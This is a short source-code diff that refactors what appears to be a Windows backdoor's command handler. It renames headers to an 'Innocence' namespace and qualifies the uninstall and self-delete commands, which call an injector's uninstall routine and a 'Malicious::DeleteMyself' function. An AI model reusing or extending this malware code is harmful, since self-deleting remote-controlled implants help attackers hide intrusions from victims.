@@ -1,7 +1,6 @@
-#include <blaspheme/Blaspheme.hpp>
+#include <Innocence.hpp>
 #include <common/Log.hpp>
 
-#include "ClientConfig.hpp"
 #include "Inhibiter.hpp"
 using namespace Inhibiter;
 
@@ -68,14 +67,14 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
 void ExecuteCommand(InhibiterCore& injector, const string& command)
 {
     FUNC_LOG(__FUNCTION__);
-	if(command == UNINSTALL_CMD)
+	if(command == Innocence::UNINSTALL_CMD)
     {
 		LOG << "Uninstall command";
         Sleep(1000);
         injector.uninstall();
-        Malicious::DeleteMyself(INHIBITER_EXE_NAME, SELF_DELETE_CMD);
+        Malicious::DeleteMyself(Innocence::INHIBITER_EXE_NAME, Innocence::SELF_DELETE_CMD);
     }
-    else if(command == SELF_DELETE_CMD)
+    else if(command == Innocence::SELF_DELETE_CMD)
     {
         LOG << "Self delete command";
         Sleep(500);
